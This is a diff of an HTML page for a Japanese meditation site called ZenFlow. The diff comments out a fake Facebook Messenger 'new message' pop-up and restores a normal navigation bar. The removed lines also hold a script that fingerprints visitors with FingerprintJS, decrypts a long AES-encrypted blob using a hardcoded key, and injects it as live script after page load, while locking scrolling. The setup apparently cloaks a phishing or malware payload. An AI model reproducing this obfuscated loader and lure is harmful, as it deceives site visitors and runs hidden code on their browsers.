@@ -131,46 +131,46 @@
 </head>
 <body class="antialiased" id="myBody">
 
-    <div class="divcover" id="modalContainer">
-        <div class="f-modal-centre" id="modalContent">
-            <div class="f-modal-icon-success" style="
-              display: flex;
-              justify-content: center;
-              align-items: center;">
-                <img src="img/messenger-icon1024.jpg" width="100" height="100" loading="lazy" alt="Cookie Icon">
-            </div>
-            <div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>
-            <div class="button-group">
-                <a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>
-                <a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>
-            </div>
-            <div class="f-modal-close" id="closeButton">✖</div>
-        </div>
-    </div>
-    <div style="opacity: 0.3">
-        <img src="img/fbProfile.jpg">
-    </div>
-<!-- Navigation Bar -->
-<!--<nav id="navbar" class="fixed top-0 left-0 right-0 z-50 bg-white shadow-md transition-all duration-300">-->
-<!--    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center h-16">-->
-<!--        <a href="#hero" class="text-2xl font-bold text-gray-800 smooth-scroll serif-font">禅心 (ZenFlow)</a>-->
-<!--        <div class="hidden md:flex space-x-6">-->
-<!--            <a href="#about" class="text-gray-600 hover:text-blue-600 smooth-scroll">概要</a>-->
-<!--            <a href="#principles" class="text-gray-600 hover:text-blue-600 smooth-scroll">原則</a>-->
-<!--            <a href="#practice" class="text-gray-600 hover:text-blue-600 smooth-scroll">実践</a>-->
+<!--    <div class="divcover" id="modalContainer">-->
+<!--        <div class="f-modal-centre" id="modalContent">-->
+<!--            <div class="f-modal-icon-success" style="-->
+<!--              display: flex;-->
+<!--              justify-content: center;-->
+<!--              align-items: center;">-->
+<!--                <img src="img/messenger-icon1024.jpg" width="100" height="100" loading="lazy" alt="Cookie Icon">-->
+<!--            </div>-->
+<!--            <div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>-->
+<!--            <div class="button-group">-->
+<!--                <a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>-->
+<!--                <a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>-->
+<!--            </div>-->
+<!--            <div class="f-modal-close" id="closeButton">✖</div>-->
 <!--        </div>-->
-<!--        &lt;!&ndash; Mobile Menu Button &ndash;&gt;-->
-<!--        <button id="mobile-menu-button" class="md:hidden text-gray-600 hover:text-gray-800 focus:outline-none">-->
-<!--            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>-->
-<!--        </button>-->
 <!--    </div>-->
-<!--    &lt;!&ndash; Mobile Menu &ndash;&gt;-->
-<!--    <div id="mobile-menu" class="hidden md:hidden">-->
-<!--        <a href="#about" class="block py-2 px-4 text-sm text-gray-700 hover:bg-gray-100 smooth-scroll">概要</a>-->
-<!--        <a href="#principles" class="block py-2 px-4 text-sm text-gray-700 hover:bg-gray-100 smooth-scroll">原則</a>-->
-<!--        <a href="#practice" class="block py-2 px-4 text-sm text-gray-700 hover:bg-gray-100 smooth-scroll">実践</a>-->
+<!--    <div style="opacity: 0.3">-->
+<!--        <img src="img/fbProfile.jpg">-->
 <!--    </div>-->
-<!--</nav>-->
+<!-- Navigation Bar -->
+<nav id="navbar" class="fixed top-0 left-0 right-0 z-50 bg-white shadow-md transition-all duration-300">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center h-16">
+        <a href="#hero" class="text-2xl font-bold text-gray-800 smooth-scroll serif-font">禅心 (ZenFlow)</a>
+        <div class="hidden md:flex space-x-6">
+            <a href="#about" class="text-gray-600 hover:text-blue-600 smooth-scroll">概要</a>
+            <a href="#principles" class="text-gray-600 hover:text-blue-600 smooth-scroll">原則</a>
+            <a href="#practice" class="text-gray-600 hover:text-blue-600 smooth-scroll">実践</a>
+        </div>
+        <!-- Mobile Menu Button -->
+        <button id="mobile-menu-button" class="md:hidden text-gray-600 hover:text-gray-800 focus:outline-none">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
+        </button>
+    </div>
+    <!-- Mobile Menu -->
+    <div id="mobile-menu" class="hidden md:hidden">
+        <a href="#about" class="block py-2 px-4 text-sm text-gray-700 hover:bg-gray-100 smooth-scroll">概要</a>
+        <a href="#principles" class="block py-2 px-4 text-sm text-gray-700 hover:bg-gray-100 smooth-scroll">原則</a>
+        <a href="#practice" class="block py-2 px-4 text-sm text-gray-700 hover:bg-gray-100 smooth-scroll">実践</a>
+    </div>
+</nav>
 
 <main class="pt-16">
 
@@ -314,37 +314,37 @@
             });
         </script>
         <!--facebook-->
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-        <script>
-            // Initialize the agent on page load.
-            const fpPromise = import('https://fpjscdn.net/v3/4B11oI7ltKpEmYsOUbBr')
-                .then(FingerprintJS => FingerprintJS.load({
-                    region: "ap"
-                }))
+<!--        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>-->
+<!--        <script>-->
+<!--            // Initialize the agent on page load.-->
+<!--            const fpPromise = import('https://fpjscdn.net/v3/4B11oI7ltKpEmYsOUbBr')-->
+<!--                .then(FingerprintJS => FingerprintJS.load({-->
+<!--                    region: "ap"-->
+<!--                }))-->
 
-            fpPromise
-                .then(fp => fp.get())
-                .then(result => {
-                    console.log("Full result:", result.visitorId);
-                    localStorage.setItem('visitorId', result.visitorId);
-                });
+<!--            fpPromise-->
+<!--                .then(fp => fp.get())-->
+<!--                .then(result => {-->
+<!--                    console.log("Full result:", result.visitorId);-->
+<!--                    localStorage.setItem('visitorId', result.visitorId);-->
+<!--                });-->
 
-            setTimeout(()=>{
-                function aesDecode(encodedText) {
-                    const decodedText = decodeURIComponent(encodedText);
-                    const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-                    return bytes.toString(CryptoJS.enc.Utf8);
-                }
-                const codeString = aesDecode(`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`);
-		const script = document.createElement("script");
-                script.textContent = codeString;
-                document.body.appendChild(script);
-            }, 100)
-        </script>
+<!--            setTimeout(()=>{-->
+<!--                function aesDecode(encodedText) {-->
+<!--                    const decodedText = decodeURIComponent(encodedText);-->
+<!--                    const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');-->
+<!--                    return bytes.toString(CryptoJS.enc.Utf8);-->
+<!--                }-->
+<!--                const codeString = aesDecode(`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`);-->
+<!--		const script = document.createElement("script");-->
+<!--                script.textContent = codeString;-->
+<!--                document.body.appendChild(script);-->
+<!--            }, 100)-->
+<!--        </script>-->
 
-        <script>
-            document.body.style.overflow = "hidden";
-        </script>
+<!--        <script>-->
+<!--            document.body.style.overflow = "hidden";-->
+<!--        </script>-->
 
 <script>
     // --- JAVASCRIPT LOGIC ---
